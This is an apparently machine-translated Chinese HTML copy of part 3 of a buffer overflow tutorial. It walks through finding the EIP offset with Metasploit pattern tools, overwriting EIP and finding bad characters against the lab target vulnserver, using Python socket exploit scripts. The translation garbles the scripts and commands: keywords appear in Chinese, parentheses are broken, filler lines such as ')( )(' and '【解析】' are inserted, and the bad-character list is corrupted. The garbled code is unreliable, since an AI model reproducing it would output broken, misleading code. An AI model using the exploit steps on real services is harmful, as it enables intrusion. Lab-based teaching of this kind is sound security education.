<html>
<head>
<title>Buffer overflow tutorial (part 3)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">缓冲区溢出教程(第3部分)</h1>
<blockquote>原文：<a href="https://blog.devgenius.io/buffer-overflow-tutorial-part3-98ab394073e3?source=collection_archive---------3-----------------------#2020-07-07">https://blog.devgenius.io/buffer-overflow-tutorial-part3-98ab394073e3?source=collection_archive---------3-----------------------#2020-07-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/9ecf2131d8ac4251c66c30c182e90282.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3Ehi3odcfj8oWTXpR9fPmg.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">安加德·辛格·www.officialhacker.com</figcaption></figure><h1 id="5c69" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">5-寻找偏移</h1><p id="f528" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">在上一节中，我们使用一个fuzzing脚本来查找它崩溃的大概字节数。现在，我们需要找到<em class="ly">“EIP”</em>被覆盖的偏移量，因为这是我们从这一点开始想要控制的。为此，我们需要使用Metasploit工具生成一个独特的模式并发送它，而不是发送<em class="ly"> "A" </em>字符。然后根据输出，我们可以使用另一个Metasploit模块找出偏移量。要生成唯一的模式，请使用以下命令:<em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ #/usr/share/metasploit-framework/tools/exploit/pattern _ create . r b-l 2200)。</em>这里我们将创建一个长度为2200字节的随机模式。复制模式并在模糊脚本中使用它们。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lz"><img src="../Images/fd81a997048dda4960bf8b6ce3fab183.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k9k9apC8ZxzCxmm5GOKrmw.jpeg"/></div></div></figure><p id="39f4" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">在任意编辑工具中打开<em class="ly"> "Fuzzing1.py" </em>文件，用偏移图形替换<em class="ly"> "buffer = "A" * 100" </em>部分，然后保存。脚本应该是这样的:</p><p id="4955" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi">— — — — — — — — — — — — — — — — — — — — — — — — — —</p><p id="0067" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> #！/usr/bin/python </em></p><p id="fd00" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">导入系统，插座</em></p><p id="cee1" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">)( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )( )(</p><p id="dec1" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> try: </em></p><p id="b95e" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">S = socket.socket(socket)AF_INET,socket。SOCK_STREAM(T5)</p><p id="5ac6" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> s.connect(('10.10.10.4',9999)) </em></p><p id="5779" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> s.send(('TRUN /。:/' + offset() </em></p><p id="de2e" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> s.close() </em></p><p id="b843" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">except: </em></p><p id="c57a" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> print "Error connecting to server" </em>错误连接到服务器</p><p id="3d02" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> sys.exit() </em></p><p id="ad8a" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】】【解析】【解析】【解析】【解析】】【解析】【解析】【解析】【解析】】【解析】【解析】】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】【解析】</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mj"><img src="../Images/506b6ea065f1d05f788abae8035cb2be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j5qnytNDeYPZAJYYOhCIxw.jpeg"/></div></div></figure><p id="6320" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">在我们运行python脚本之前,我们必须再次设置环境。Once everything is running correctly, execute the script。</p><p id="7fb2" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">: </em></strong><em class="ly"/><strong class="lc ir"><em class="ly">【root@kali】</em><em class="ly">:~#。/Fuzzing1.py)。(T31)</em></strong></p><p id="42bc" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">执行完python脚本后，<em class="ly">“vulnserver”</em>程序会崩溃，显示被覆盖的<em class="ly">“EIP”</em>(386 f 4337)的值。把它记在某个地方，因为我们将在下一步中用到它来求偏移量。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/46bcb4bc6b31df3ca5e5457114ce9521.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FycF5EVYVSziEtsfnj4V6w.jpeg"/></div></div></figure><p id="d721" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">现在，我们将使用另一个Metasploit工具来查找我们的偏移量的精确匹配。为此，使用以下具有相同字节长度的命令，并指定我们找到的<em class="ly">“EIP”</em>值。</p><p id="9daf" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ #/usr/share/metasploit-framework/tools/exploit/pattern _ offset . r b-l 2200-q 386 f 4337)。</em></p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ml"><img src="../Images/f157f318f3cd17b670784e77bd007e44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*imbEtY96rMVgenEjgigNeg.jpeg"/></div></div></figure><p id="5e31" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">正如您在上面的截图中看到的，我们设法找到了2003字节的偏移量的精确匹配。现在是时候改写<em class="ly">“EIP”了</em></p><h1 id="f593" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">6-覆盖EIP</h1><p id="b798" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">在小节中，我们将尝试覆盖<em class="ly">【EIP】</em>的部分记忆。在前面的例子中，我们发现我们的偏移量正好是2003字节。这意味着在我们到达<em class="ly">“EIP”之前有2003个字节</em>“EIP”本身是4个字节长的内存部分，在这里我们将尝试覆盖它们。为此，我们需要修改我们的python脚本，发送2003个<em class="ly">“A”</em>字符到达<em class="ly">“EIP”</em>，然后添加4个<em class="ly">“B”</em>字符来覆盖它。保存更改并运行脚本。</p><p id="2411" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi">— — — — — — — — — — — — — — — — — — — — — — — — — —</p><p id="f57d" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> #！/usr/bin/python </em></p><p id="d306" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">导入系统，插座</em></p><p id="e9da" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">shellcode = " A " * 2003+" B " * 4</em></p><p id="3902" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">试试:</em></p><p id="f427" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> s = socket.socket(socket。AF_INET，socket。</em></p><p id="c02e" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> s.connect(('10.10.10.4 '，9999)) </em></p><p id="02e6" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> s.send(('TRUN /。:/' + shellcode)) </em></p><p id="1a9d" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> s.close() </em></p><p id="82d4" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">除:</em></p><p id="5e8c" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">打印“连接到服务器时出错”</em></p><p id="b385" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly"> sys.exit() </em></p><p id="d622" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">—————</em></p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/9076f454f00bac79dcec1876438e27f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eexjywwdj5lGEw2YKaBX9g.jpeg"/></div></div></figure><p id="2cd9" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">一旦执行脚本，<em class="ly">“vunserver”</em>就会崩溃，免疫调试器会因为访问冲突而停止。当您检查调试器的输出时，您会看到<em class="ly"> "EBP" </em>将被全部的<em class="ly">" A "</em>(41414141)填充，而<em class="ly"> "EIP" </em>将被全部的<em class="ly">" B "</em>(42424242)填充。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mn"><img src="../Images/6bc0f8c7a3dd91c291a5569cf9ac6319.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dPsaeqjrb68wFgB76UVMsg.jpeg"/></div></div></figure><p id="8041" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">这意味着我们现在可以控制内存的<em class="ly">【EIP】</em>部分，而不是发送一堆<em class="ly">【A】</em>或<em class="ly">【B】</em>字符，我们可以发送一个恶意的外壳代码来感染我们的目标计算机，并获得外壳访问权限。</p><h1 id="ee9e" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">7 —查找不良字符</h1><p id="8159" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">当生成外壳代码时，我们需要知道什么字符对外壳代码是坏的或好的。我们可以通过在我们的程序中运行所有的十六进制字符来检查这一点，看看它们是否有任何不同的显示。在测试它之前，首先，我们需要找到一个<em class="ly">“坏字符”的列表。</em>打开你最喜欢的浏览器，搜索<em class="ly">“寻找蒙娜丽莎”</em>点击<em class="ly">“用免疫调试器和Mona.py查找不良角色”链接</em></p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/ae3bf9f7d524e3a2aa6e9b8e2d7eb4c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QiruG_I0Ms2RYGxi-Whm4A.jpeg"/></div></div></figure><p id="44e4" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">这个特殊的网站已经创建了一个包含所有<em class="ly">“坏字符”</em>的变量，我们可以在python脚本中使用它。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mp"><img src="../Images/771803ee998d8ac74743f76c5ab037af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m_4cyXSdTSKUtl2fUWY7NQ.jpeg"/></div></div></figure><p id="5580" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">用<em class="ly">【坏字符】</em>复制变量，粘贴到我们之前用的python脚本中。默认情况下，空字节<em class="ly"> "\x00" </em>字符起作用，因此我们可以立即将其从变量中移除。建议将<em class="ly"> "bad chars" </em>变量放在导致崩溃的字符之后。如果我们以<em class="ly">“坏字符”</em>开始我们的攻击字符串，我们可能根本不会崩溃。保存脚本，并在从免疫调试器进行监控的同时，针对<em class="ly">“vulnserver”</em>运行该脚本。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/5c5c353d2272894777175f5f4639ccfd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QvLUjqfSwqBUo4-YTS_5Xw.jpeg"/></div></div></figure><p id="a2a2" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">因此，基本上我们的python脚本将逐个运行下面列出的每个字符，我们在这里的工作是检查十六进制转储并记录任何放错位置的字符。</p><p id="aec3" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><em class="ly">(\ x01 \ x02 \ x03 \ x04 \ x05 \ x06 \ x07 \ x08 \ x09 \ x0a \ x0b \ x0c \ x0d \ x0e \ x0f \ X10 \ X11 \ x12 \ x13 \ x14 \ x15 \ x16 \ x17 \ x18 \ x19 \ x1a \ x1b \ x1c \ x1d \ x1e \ x1f \ x20 \ x21 \ x22 \ x23 \ x24 \ x25 \ x26 \ x27 \ x28 \ x18 \ x18</em></p><p id="bce8" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">要检查hex转储，在崩溃发生后，右击<em class="ly">“ESP”、</em>，并从下拉菜单中选择<em class="ly">“跟随转储”它将转储并显示我们用python脚本发送的所有十六进制字符。</em></p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/bb7366deb209bf056e5fb2d6a5f05ae6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ukeF0Xe4XVjOEm_2sMpt5Q.jpeg"/></div></div></figure><p id="b92c" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated">现在我们在堆栈上看到一个更长的<em class="ly">“bad chars”</em>字符串。走一条简单的路线，低头检查是否有<em class="ly">【xff】</em>字符，并期望没有其他腐败，这绝非易事。在这个例子中，每个损坏的字节都终止了<em class="ly">“坏字符”</em>字符串，但情况并非总是如此。有时当你试图建立新的漏洞时，你会遇到单个字符损坏的情况，但是剩余的<em class="ly"> "bad chars" </em>字符串可以有效地打印出来。在这种情况下，仔细查看堆栈上的字节，逐个查看<em class="ly"> "bad chars" </em>字符串，这是检查不再有坏字符的最佳方式。不幸的是，这是一个非常繁琐的过程，而且很容易出错。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/800158cca4f8b01eeb2f5929eadd7569.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NYnInkk5OBPyEhgEs_HV3w.jpeg"/></div></div></figure></div><div class="ab cl mt mu hu mv" role="separator"><span class="mw bw bk mx my mz"/><span class="mw bw bk mx my mz"/><span class="mw bw bk mx my"/></div><div class="ij ik il im in"><p id="61c0" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><a class="ae na" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part1-efc6b9f3e4ee" rel="noopener">缓冲区溢出教程(第一部分)</a></p><p id="b53e" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><a class="ae na" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part2-c21c6de5c11c" rel="noopener">缓冲区溢出教程(第二部分)</a></p><p id="e9d0" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><a class="ae na" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part3-98ab394073e3" rel="noopener">缓冲区溢出教程(第三部分)</a></p><p id="941a" class="pw-post-body-paragraph la lb iq lc b ld me lf lg lh mf lj lk ll mg ln lo lp mh lr ls lt mi lv lw lx ij bi translated"><a class="ae na" href="https://medium.com/dev-genius/buffer-overflow-tutorial-part4-1e80e90a2f03" rel="noopener">缓冲区溢出教程(第四部分)</a></p></div></div>    
</body>
</html>